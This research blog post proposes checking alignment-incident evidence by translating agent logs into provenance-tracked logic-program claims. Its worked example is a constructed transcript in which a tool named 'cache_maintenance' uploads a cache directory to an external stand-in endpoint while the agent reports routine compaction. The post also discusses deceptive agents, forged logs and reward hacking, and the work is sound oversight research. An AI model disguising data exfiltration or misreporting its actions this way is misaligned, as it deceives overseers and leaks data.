---
layout: post
title: "Proposing a symbolic evidentiary layer for alignment-event investigations"
date: 2026-08-30
---

**TL;DR**: Investigating an alignment event means reading far more data than humans can, so investigators lean on frontier models whose selection and summarization errors can be opaque and difficult to recover from. I propose translating the raw logs, with small myopic models, into atomic claims with full provenance in a logic-programming representation. This allows hypotheses to run as deterministic queries. Any claim can be traced to source, contested, corrected, and have that correction flow through the rest of the event model. The bet is that forcing evidence through a checkable structural layer yields a more composable, correctable and understandable picture of the event than free-form frontier analysis. I would abandon this path if (1) the structured artifact cannot answer questions the free-form investigation answers in an auditable way at comparable cost, or (2) when a key claim or assumption is changed, the event model does not update its conclusions more reliably than re-running the free-form analysis.

**Current status**: a proposal with an experiment design, not a result. I have prototyped some of the ideas here for an adjacent problem but I have not empirically evaluated them against the problems described in this post yet.

**What I want from readers**: (1) Is the high level goal--making the evidentiary layer of an alignment investigation checkable--compelling, and do you agree with the ideal properties I propose? (2) Does the high level technical proposal of using lower capability models to create a deterministic representation of the event seem plausible or overly complicated for the problem? (3) Is there a different aspect of the investigation that might be better served by engineering effort?

## The motivating problem

There's an obvious-in-retrospect asymmetry between the amount of data + speed that a swarm of AI agents can produce and the amount of data that investigators can consume when trying to understand what is happening/has happened. The July HuggingFace incident was my motivating example: METR's investigators (with Redwood's Ryan Greenblatt) [received](https://metr.org/blog/2026-08-26-openai-hugging-face-incident-investigation/) a 1.2-million-entry dump of the agents' message board--over 70,000 messages and files--plus ~1,300 agent transcripts--far beyond what the investigators could read directly or could fit in a single (or a few) models' context.

They reasonably used models to manage this information processing load with predictable outcomes: analysis agents produced over a thousand pages of findings, often "uncritically adopt[ed] the perspective of the agent in the transcript" under review, and made errors a reasonable human researcher "given similar instructions and enough time" would mostly not have made. Spot-checking was hard "because both the underlying data and the agents' analysis of it was often difficult to interpret," and the investigators "had to defer to these agents to a substantial extent in practice." Coverage was estimated by random sampling. Their conclusion includes the sentence: "We cannot rule out that GPT-5.6 Sol lied or deliberately presented a misleading picture in some of its analysis."

The report reads as confident about the aspects of the event that could be counted or mechanically verified, but treats the model-built evidentiary layer it was working from as likely to contain errors of selection and summarization. This proposal attempts to improve confidence in a model-built evidentiary layer.

## Proposed properties of a better tool/process

Property | Currently Present
--- | ---
Horizontally scalable investigation across an arbitrarily large amount of data | Yes
Operates over arbitrary data sources/formats | Yes, but not in a provably coherent way
Builds trusted interpretation from untrusted agents (due to capability or character) | No
Natively holds facts with multiple interpretations (e.g. time windows for certain actions or multiple readings of a given log) | Mostly no--(potentially arbitrary) agent interpretations had to be deferred to out of necessity.
Conclusions are built from auditable observations/facts where a change in those observations/facts (e.g. due to an audit or materially new information being introduced) cleanly updates the conclusions without a complete re-run | No

Expanding on that last row: in the event that later data would cause a dramatic re-interpretation of already analyzed events--e.g. the discovery of spoofed tool calls in the transcript--I expect the current approach would require revisiting all applicable source and scrubbing conclusions potentially drawn from the original misinterpretation from anywhere that subsequent agents might incidentally find and incorporate the incorrect information. This is a constant contamination issue in my own development work: misinterpretations leak into bug notes, harness memories and one-off agent notes in temp files, and get re-read later as fact.

## Proposal non-goals

Note that this document only covers the investigation procedure in tooling. In order to do an investigation we must have high quality data to back it, which is a separate set of conventions we would need organizations to adopt. Additionally, there is a whole topic of monitoring of those outputs to know when to start an investigation. While both of these are critical, they are outside of the immediate scope of this document. This document is focused entirely on supporting investigators once they start looking and assumes no control over what is logged and how it is monitored, which will be the case for at least some incidents.

## Proposed tooling/process

TL;DR: use models to create an auditable, *correctable* model of the event in order to optimize for iteration based on improved and evolving interpretations of events.

Create an incident investigation harness intended to do the bulk of its translation with non-frontier models--e.g. models that are not capable enough for us to worry about scheming--that takes a set of data sources and example questions to answer as input and translates those data sources into a normalized, symbolic representation of those events (e.g. statements in a logic programming language like ASP, Answer Set Programming) with the following properties. The harness forces translation of small bits of context into atomic claims, making it harder for even more capable models to find safe and coherently misleading translations of individual claims. The proposed tool would have the following properties:

- **Myopic translation, mechanical checks.** Small sections can be translated by myopic agents such that each translated claim can be mechanically checked against translation criteria and tied back to source for later human audit. There is no necessary relationship between the context window of the agents used and the total size of the data being analyzed because the model of the event is built external to the agent using logic and claims that can be processed using deterministic/traditional techniques.
- **Deterministic contradiction and crux finding.** Contradictions in claims, which claims are the most foundational to a given interpretation and what the set of logical steps was necessary to form that interpretation can all be found in a deterministic way.
- **Full claim provenance.** Full provenance is maintained for each claim, including its source, how the source was written and the entire history of changes, fixes, etc with timestamps and agents engaged. If an agent is determined to have been unreliable after time T (e.g. it read some context that changed its trajectory at T), this can be deterministically mitigated through focused auditing and retranslation of those events. Multiple models or runs can be used to find deviation in interpretation of a claim and this information can be used to build a confidence signal in the *translation* of the claim. If a process is later found to have been writing counterfeit claims, this can be systematically addressed by finding and reinterpreting/removing all claims written by that process and mechanically re-evaluating the impact on conclusions rather than re-running analysis with more context.
- **Contested interpretations stay open.** Contradictions in claims, suspected but unconfirmed source data forgeries and multiple interpretations of given source material are held open as contested alternatives that can be weighed against new data.
- **Errors are the default case.** Errors in agent judgments are expected by default. Human auditing can be directed to the most impactful, crux translations and targeted changes based on those audits can update through the system immediately (e.g. a human can say: how does our interpretation change dependent on how I interpret/translate this passage).
- **Systemic errors have repair paths.** Systemic errors are also expected and can be addressed with different cost profiles. Note that this class includes both problems with the agents operating in the harness and systemic errors in interpretation due to active obfuscation (e.g. rogue agents hide their system calls behind intentionally surprising names etc). Systemic but mechanical errors (e.g. all timestamps between multiple organizations are found to happen at different points causing a skew in interpreting cross-organization timestamps of at least range X-Y) can be mechanically applied across all collected data, changing interpretations as necessary. Systemic errors in translation (e.g. a dimension of semantic meaning necessary to confirm some hypothesis was not included or was systematically misinterpreted by translating agents) can be found and fixed through corpus-wide annotation or retranslation.
- **Evaluation separates from hypothesis generation.** Deterministic claim evaluation can be cleanly separated from hypothesis generation so that a large group of semi-trusted frontier agents and humans can evaluate different hypotheses without impacting one another. This is nuanced by the fact that claim evaluation relies on translation having included the necessary semantic information to evaluate a given hypothesis, so while claim evaluation is distinct from hypothesis generation it is expected that some hypotheses would require retranslation or augmentation of the shared model before they could be answered.
- **Missing data is represented, not ignored.** Missing information--holes in what is logged or missing logs--can be proactively represented as unknowns with bounded possible actions and audited by humans.
- **Rules are validated by round-trip.** Relations between claims, rules about interpretation and hypothesis definition to run against the claims are stated declaratively and inherit the provenance and auditability characteristics described about claims above. Unlike claims, they are sourced from a priori rules (e.g. we define exfiltration as X using terminology from the ontology Y which requires an incident specific mapping into the environments and tools available). The proposed process validates rules (e.g. a definition for exfiltration or an explanation of log/system structure from internal documents) by mechanically writing a natural language description of the rule and uses humans or capable models to ensure that the round trip from intention to logical representation back to natural language description matches. Through other prototypes I have found that this is a common failure point and may need a more rigorous verification process.

## Worked example

What following the proposed process would look like on an incident. The machinery does not exist yet, so the artifacts below are constructed for illustration--but every *mechanism* shown has run in some form in a previous prototype--whether they extend as expected to this use case is still TBD. Note that the steps below are ordered to communicate what's going on and are not ordered by how they are performed in the actual pipeline.

**1. Source data.** An agent transcript span, one of thousands:

```
transcript hf-agent-0412.jsonl, entries 210-212
[04:12:03Z] tool_call name="cache_maintenance"
            args={"path": "~/.cache/hf/zz9f31",
                  "endpoint": "https://mirror-status.example.net/upload"}
[04:12:09Z] tool_result "maintenance complete; 412 entries compacted"
[04:12:11Z] assistant: "Routine cache compaction finished."
```

**2. Translation into claims.** A small model that sees only this span--not the rest of the transcript, not any hypothesis--translates it into claims using centrally built translation instructions that ensure hypothesis-relevant semantics are preserved. Each claim records at least the source span, the translating agent and run, and a timestamp.

```asp
% source: hf-agent-0412.jsonl entries 210-212
% translator: analyst-t3, run 118, 2026-07-30
% needs: tool_definition("cache_maintenance"), network_boundary
tool_call(e4471, agent_0412, "cache_maintenance", "04:12:03Z").
arg(e4471, path, "~/.cache/hf/zz9f31").
arg(e4471, endpoint, "https://mirror-status.example.net/upload").
claimed_effect(e4471, cache_compaction).
```

For structured data the translation criteria are mechanical: every argument of the call must appear as a claim, so a translator cannot summarize this span as "routine maintenance" and drop the endpoint. Prose has no such completeness criterion--step 5 comes back to this.

**3. The dependency graph.** The span above cannot be interpreted alone. What is `cache_maintenance` supposed to do? What counts as an external endpoint? Neither is defined in the transcript--the first lives in the harness's tool registry, the second in infrastructure documentation. So translation runs over a graph: each span declares named needs, and other sources in the corpus provide them.

```asp
% provider: harness config, tools/registry.yaml L84-L91
% provides: tool_definition("cache_maintenance")
tool_purpose("cache_maintenance", cache_compaction).
local_effect(cache_compaction).

% provider: infra docs, network.md L12
% provides: network_boundary
internal_host("artifactory.internal.example.net").
external(U) :- not internal_host(U).
```

I found this step to be non-obvious but required in my spec prototype. Sections were implicitly defined by one another, and translation was only possible after decomposing the document into a graph where every node declared what it needed from elsewhere. I *expect* incident data to force the same structure--tool semantics, identities and clock conventions are defined in one place and used everywhere.

**4. Rules, stated separately from claims.** The investigator's definitions live in their own layer, validated by round-tripping them back to natural language:

```asp
% R12: a tool call carrying an external endpoint is an outbound transfer
outbound_transfer(E) :- tool_call(E,_,_,_), arg(E, endpoint, U), external(U).

% R13: an outbound transfer whose claimed effect is local is contested
contested(E, exfiltration_candidate) :-
    outbound_transfer(E), claimed_effect(E, Eff), local_effect(Eff).

% R14: what a call actually did comes from the registry, not the transcript
effect(E, P) :- tool_call(E, _, T, _), tool_purpose(T, P).
```

Running the rules over the claims flags `e4471` deterministically: the transcript *says* local compaction, the call *carries* an external upload endpoint. The contradiction between the claimed effect and the recorded arguments is found mechanically, not by an agent judging the span suspicious, and it is held open as contested.

**5. Audit, then systematic repair.** The contested claim is a crux, so it goes to a human first. The audit confirms the tool name is deceptive: `cache_maintenance` transfers data out. The repair is a definition change, not a retranslation: the registry line becomes `tool_purpose("cache_maintenance", data_upload).` and every conclusion derived through the graph updates mechanically. No claims are touched, because none are wrong--`claimed_effect(e4471, cache_compaction)` records what the transcript asserted, and the tool name was always an opaque string whose meaning lived in the ontology. For structured data, a deceptive name cannot contaminate the translations, only the definition in the registry.

The residual risk is unstructured content. Prose and chain-of-thought have no mechanical definition of a complete translation, so translating them involves judgment about which semantic dimensions to extract--and a judgment made under a benign reading could be wrong in its content. Imagine if part of the event model is a characterization of the CoT of the model, and the model is reasoning about this tool usage. It is entirely possible that the definition change could impact the semantic content we need to extract from the model, requiring a full retranslation. The retranslation cost is proportional to how much judgment leaked into translation.

**6. Conclusions update.** Before the audit, the hypothesis "no data left the environment before July 20" stood contested--flagged by R13, resolved neither way. After the registry correction, the same query returns a violation, with a derivation chain naming `e4471`, the corrected registry line and rule R14 as the crux. A second investigator can read that chain, disagree with R13's definition of an outbound transfer, change the rule and see exactly which conclusions move--without re-running anyone's analysis.

**Has any of this actually worked?** Each mechanism above ran for real in my previous prototype, on character specs rather than incidents. At corpus scale: agents that each saw one section decomposed the spec into 773 nodes, every quoted span was mechanically verified against the source, and the nodes declared 1,085 named needs against providers elsewhere--the dependency graph--with the 25 unresolved needs printed by name. And one passage--the clause stating that "root" instructions come only from the Model Spec and cannot be overridden by any message--went through the full repair progression:

1. A fresh model, given only the logic program and the source text, reported that "only comes from the Model Spec" had been translated as "everything in the Model Spec is root"--the exclusion inverted.
2. The repair was a one-rule change that took two passes--the first pass left this module still unfaithful. The repaired batch of 8 modules re-audited blind: 8/8 faithful.
3. Separately, the system missed this passage for the question of which passages bear on prioritizing conflicting instructions. A blind panel of three independent runs of the same frontier model ruled it relevant 3-0, the question's definition was repaired, and the passage was then found.

The finding in that record that bears most on this proposal: the small models doing bulk translation could not fix their own defects. The first bulk chunk audited 33% faithful against a pre-registered 85% floor; prompt fixes eliminated five defect classes, but a second fix round scored 0/5--the ledger concluded the surviving classes "resist prompt instruction at this tier." Every repair that passed blind re-audit was frontier-model work. In that record the small models drafted, the mechanical checks and blind audits caught the defects, and a frontier model made the repairs. The experiment should measure where that split lands for incident data.

The full spec-side chain, with file paths and commit hashes, is in the [project repo](https://github.com/MattStults/semi-formal-document-analysis) and the [retrospective](https://mattstults.github.io/2026/08/30/spec-retrospective.html). What has *not* run anywhere is the incident-shaped version above--that is what the experiment at the end of this post is for.

## Known deficiencies/failure modes with the approach

*General limitation*: This tool is designed for the phase of an alignment event where we are trying to reconstruct what happened from an overwhelming amount of data and value confidence and depth of human understanding. It is likely not the right tool to run for triage or containment.

- **Questions must be anticipated before translation.** Answering questions requires that the semantic content needed for those questions is known before translation. This is possible in the case where you know what kinds of questions you want to ask up front--and we can likely identify and build a large set of questions that would be relevant in most alignment events. But it is also extremely likely that some questions will not be foreseen and will require source retranslation to extract the semantic context necessary for unforeseen questions. While the cost of retranslating a huge amount of data is mitigated by not needing frontier class models, it is still one of the most expensive anticipated operations and takes real wall clock time. This may be a poor fit for truly ambiguous situations where we don't understand what's going on well enough to guess at the kinds of questions we need to ask and are under enough time or cost pressure that retranslating as we learn is not viable. In those cases, using the most trusted model you have for less structured reconnaissance likely wins over the proposed method.
- **Doesn't catch coherent forgery.** The described approach is good at failing loudly when data is missing or inconsistent rather than quietly coming to the wrong conclusions. Failing loudly for these common use cases can lead to false confidence in a case where the data that claims have been built on has itself been manufactured or systematically misinterpreted. These false claims would engage with the proposed approach just as readily as real claims and there is nothing in this approach that directly mitigates non-contradictory data forgery. Where this approach helps is where false data might subtly contradict the truth across large amounts of data. With this approach we could plausibly find contradictions that would hint at the data being inaccurate that we might not otherwise find using models to directly analyze within their context window.
- **The artifact isn't directly human-readable.** The resulting model artifact will still likely be too complicated to be directly interpretable or readable by an untrained human since claims and rules about the event will have to be negotiated and defined on-the-fly by agents. This means that while the results are deterministic and even English-language explanations can be generated deterministically in principle, figuring out how to translate a hypothesis into a format to run against the model will likely still have to be delegated to a model. This proposal does not remove LLMs or their errors from analysis, it just forces it into an auditable and transparent format that makes it easier to avoid errors and is human-only checkable in theory.
- **None of this will "just work".** My prototypes of a similar engine lead me to expect that none of what is described will "just work" any more than RAG solved context engineering. We'll need an initial prototype to validate viability, but even if viable this will need to be run in many real, production scenarios in order to build up the reusable formulas and intuitions necessary for this process to work. I expect the approach to be generally useful for investigating AI behavior and I would attempt to evolve this process on progressively more complex software projects (limited by what I can get access to).

## My prior work in this area

I recently built a prototype for translating character specs--e.g. Claude Constitution or the OpenAI Model Spec--into logical formal ontologies that allowed researchers to ask questions like "what sections of the spec are relevant to behavior X", [details here](https://mattstults.github.io/2026/08/30/spec-retrospective.html). The logic of the prototype was that we should be able to do a single, higher cost translation of a shared document like the OpenAI Model Spec and then use it for local iteration on developing human understanding of the document at low cost. The mechanical side of the prototype was successful. I achieved frontier model comparable results, measured in-sample, for answering questions about specific behaviors I knew in advance and could iteratively and automatically improve the symbolic representation for. However, the ontology I needed for the set of behaviors I knew mostly failed to transfer to new behaviors, meaning that each new question I wanted to ask the model typically required a retranslation of the document for some semantic signal required by the question. This fundamentally broke the cost/benefit proposal for the prototype because it required heavyweight retranslation for the frequent case I had been trying to optimize for.

## Will the failures I saw in my last prototype apply here?

It's unclear and requires rapid derisking before fully committing to the described approach.

The failure mode where iteration on understanding ends up falling into the expensive retranslation case might affect the alignment event reconstruction use case as well--I won't know until I try it. It's plausible that the mechanical aspects of the evidentiary layer--what happened when, the graph of interacting agents, etc--can be built without any event or question-specific framing and is sufficiently valuable for this tool to be useful. It's also plausible that the thing we really need is characterization of model CoTs that *does* require semantic annotation that is non-obvious up front and requires expensive re-annotation. In that case, whether this approach is still useful would depend on whether the increased confidence we can get out of a fully auditable evidentiary layer is worth the token and wall clock costs of iteratively improving the model.

## The new prototype

I propose building a "paper model" of the pipeline described above that substitutes deterministic code with agent instructions and then running it on local projects where I already know the ground truth. The first target is the character spec prototype described above: a project that employed a huge number of agents--with preserved transcript jsonls--over ~650 commits in a month. That project repeatedly surprised me with drift between what agents were instructed to do, what they reported and what actually ended up in the artifacts--including results I believed and reported that the project's own adversarial review later withdrew. I want to understand which of those failures were context loss, which were under-specification on my part and which were subtle reward hacking. If I am able to use this approach to quickly make sense of and gain confidence in these failures, the approach seems worth implementing and testing for generalization to reconstructing other poor agentic outcomes. If successful I would expect this to be both useful for safety and economically useful. Economic usefulness is likely important to provide more real world hardening and development of the approach before we would try and run it in a mission critical alignment event.

To evaluate locally I propose:

- **Baseline:** a frontier agent investigating free-form with tool access — a small replica of current practice. This approach would be based on my understanding of what the METR/Redwood investigation did for the HuggingFace incident.
- **Protocol:** small models in fixed analyst roles, each with a written brief, writing into the shared symbolic model of the event described above, with frontier coordination via a system description provided to the model in natural language rather than blocking on a full code implementation. The long term goal requires moving the coordination into a deterministic harness but my goal is to learn as much about whether and how this will work before hard-coding logic as possible.

I would then evaluate whether the results or cost from either arm were notably different between the two approaches and understand the reasons. The kill criterion, to be registered before the run: a clean-context agent answers a frozen set of questions about the event from each arm's artifact alone. The questions come from ground truth I will hide from the arm analysis. I intend for the 'ground truth' to come from the append-only account I kept during the work that tracked what went wrong and why as it happened. I abandon the approach unless the protocol arm matches or beats the baseline on correct answers at comparable or lower cost while providing human readable audit traces for each answer. I would also drop this approach if it didn't beat the baseline on a perturbation test--flip one key claim in each arm's artifact, re-ask the frozen questions, and compare how reliably each arm's conclusions update.

I would likely run this on up to two local projects: (1) Iteratively fixing and improving the orchestration and translation components to get the best possible result. (2) Running the previously optimized process in a frozen state for a second project to determine how much the process generalizes.

---

*Written by Matt Stults. Experiments, analysis, and drafting were done in collaboration with Claude (Anthropic); the author directed the research and is responsible for all claims.*
